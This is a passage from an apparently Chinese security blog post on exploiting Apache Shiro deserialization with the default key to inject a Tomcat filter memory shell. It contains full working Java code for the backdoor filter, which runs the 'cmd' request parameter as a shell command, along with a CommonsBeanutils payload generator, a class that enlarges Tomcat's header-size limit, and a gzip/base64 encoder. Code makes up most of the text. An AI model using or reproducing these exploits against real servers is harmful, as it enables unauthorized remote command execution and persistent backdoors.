class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.webresources.StandardRoot;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterMemShellExp</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FilterMemShellExp</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">WebappClassLoaderBase</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 注意这里的contextClassLoader实际是ParallelWebappClassLoader类型的（WebappClassLoaderBase抽象类的子类），resources属性在WebappClassLoaderBase类中</span></span><br><span class="line">        <span class="comment">// 因此这里获取resources属性需要在其父类去找，getDeclaredField()无法获取父类的属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">resources</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 这里jsp和spring的resource路径不一样，jsp只需要一次getSuperclass，SpringBoot需要两次,所以这里最好都试一下</span></span><br><span class="line">            resources = contextClassLoader.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;非SpringBoot环境&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                resources = contextClassLoader.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;SpringBoot环境&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e2)&#123;</span><br><span class="line">                e2.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        resources.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardRoot</span> <span class="variable">standardRoot</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            standardRoot = (StandardRoot) resources.get(contextClassLoader);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardRoot.getContext();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">        Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;justdoit&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMemShellExp</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        <span class="comment">//拦截的路由规则，/* 表示拦截任意路由</span></span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将filterMap注册到standardContext.filterMaps中</span></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据前面的filterDef和standardContext创建一个ApplicationFilterConfig对象</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将filterConfig注册到standardContext.filterConfigs中</span></span><br><span class="line">        filterConfigs.put(name, filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FilterMemShellExp</span><span class="params">(String aaa)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="comment">//这里写上我们后门的主要代码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> res.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        <span class="comment">//别忘记带这个，不然的话其他的过滤器可能无法使用</span></span><br><span class="line">        filterChain.doFilter(req, res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.Base64.getDecoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cb_shiro_exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;FilterMemShellExp&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;ctClass.toBytecode()&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;TemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Queue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">finalPayload</span> <span class="operator">=</span> aes.encrypt(payload, key);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> finalPayload.toString();</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        System.out.println(poc.length());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是要介绍怎么战胜这里的困境来回显命令执行的结果。</p><h1 id="修改maxHttpHeaderSize"><a href="#修改maxHttpHeaderSize" class="headerlink" title="修改maxHttpHeaderSize"></a>修改maxHttpHeaderSize</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们既然可以打入内存马，那改一下 <code>Tomcat</code> 的参数肯定也是可以实现的，找一下 <code>maxHttpHeaderSize</code> 这个参数存在那里然后修改大一点就可以了。</p><p><img src="/imgs/Pasted%20image%2020240324031256.png"></p><p>我们可以发现修改 <code>httpMaxHeaderSize</code> 的 <code>Payload</code> 的长度大概在 <code>6000</code> 多，是可以过 <code>Tomcat</code> 的默认值的监测的。</p><p><img src="/imgs/Pasted%20image%2020240324030620.png"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.webresources.StandardRoot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil1</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> org.apache.catalina.core.StandardContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">serviceField</span> <span class="operator">=</span> org.apache.catalina.core.ApplicationContext.class.getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> org.apache.coyote.RequestInfo.class.getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">headerSizeField</span> <span class="operator">=</span> org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField(<span class="string">&quot;headerBufferSize&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">getHandlerMethod</span> <span class="operator">=</span> org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(<span class="string">&quot;getHandler&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            headerSizeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            serviceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getHandlerMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span></span><br><span class="line">                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="comment">// 这里applicationContext的获取方式适用于Tomcat低版本，因为高版本webappClassLoaderBase的getResources()方法被废弃了，会返回null</span></span><br><span class="line"><span class="comment">//            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());</span></span><br><span class="line">            <span class="comment">// 这里适用于Tomcat高版本</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">resourcesField</span> <span class="operator">=</span> webappClassLoaderBase.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">            resourcesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardRoot</span> <span class="variable">standardRoot</span> <span class="operator">=</span> (StandardRoot) resourcesField.get(webappClassLoaderBase);</span><br><span class="line">            org.apache.catalina.core.<span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (org.apache.catalina.core.ApplicationContext) contextField.get(standardRoot.getContext());</span><br><span class="line"></span><br><span class="line">            org.apache.catalina.core.<span class="type">StandardService</span> <span class="variable">standardService</span> <span class="operator">=</span> (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);</span><br><span class="line">            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; connectors.length; i++) &#123;</span><br><span class="line">                <span class="comment">// 筛选http协议</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="number">4</span> == connectors[i].getScheme().length()) &#123;</span><br><span class="line">                    org.apache.coyote.<span class="type">ProtocolHandler</span> <span class="variable">protocolHandler</span> <span class="operator">=</span> connectors[i].getProtocolHandler();</span><br><span class="line">                    <span class="keyword">if</span> (protocolHandler <span class="keyword">instanceof</span> org.apache.coyote.http11.AbstractHttp11Protocol) &#123;</span><br><span class="line">                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; classes.length; j++) &#123;</span><br><span class="line">                            <span class="comment">// org.apache.coyote.AbstractProtocol$ConnectionHandler</span></span><br><span class="line">                            <span class="keyword">if</span> (<span class="number">52</span> == (classes[j].getName().length()) || <span class="number">60</span> == (classes[j].getName().length())) &#123;</span><br><span class="line">                                java.lang.reflect.<span class="type">Field</span> <span class="variable">globalField</span> <span class="operator">=</span> classes[j].getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                                java.lang.reflect.<span class="type">Field</span> <span class="variable">processorsField</span> <span class="operator">=</span> org.apache.coyote.RequestGroupInfo.class.getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                                globalField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                                processorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                                org.apache.coyote.<span class="type">RequestGroupInfo</span> <span class="variable">requestGroupInfo</span> <span class="operator">=</span> (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, <span class="literal">null</span>));</span><br><span class="line">                                java.util.<span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> (java.util.List) processorsField.get(requestGroupInfo);</span><br><span class="line">                                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; list.size(); k++) &#123;</span><br><span class="line">                                    org.apache.coyote.<span class="type">Request</span> <span class="variable">tempRequest</span> <span class="operator">=</span> (org.apache.coyote.Request) requestField.get(list.get(k));</span><br><span class="line">                                    <span class="comment">// 10000 为修改后的 headersize</span></span><br><span class="line">                                    headerSizeField.set(tempRequest.getInputBuffer(), <span class="number">10000</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 10000 为修改后的 headersize</span></span><br><span class="line">                        ((org.apache.coyote.http11.AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(<span class="number">10000</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;修改成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;修改失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="将class-bytes使用gzip-base64压缩编码"><a href="#将class-bytes使用gzip-base64压缩编码" class="headerlink" title="将class bytes使用gzip+base64压缩编码"></a>将class bytes使用gzip+base64压缩编码</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>原理正如标题已经很清楚了。实测压缩后内存马的长度会从 <code>7000</code> 多降低到 <code>3000</code> 多，但是注入的命令执行的类的长度还是在 <code>8000</code> 多会超过 <code>Tomcat</code> 的默认 <code>maxHttpHeaderSize</code> 的限制。所以这个方法不是很建议使用。</p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><p>第一步：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;FilterMemShellExp&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="type">byte</span>[] bytecode = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">GZIPOutputStream</span> <span class="variable">gzipOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(baos);</span><br><span class="line">        gzipOutputStream.write(bytecode);</span><br><span class="line">        gzipOutputStream.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.encodeToString(baos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 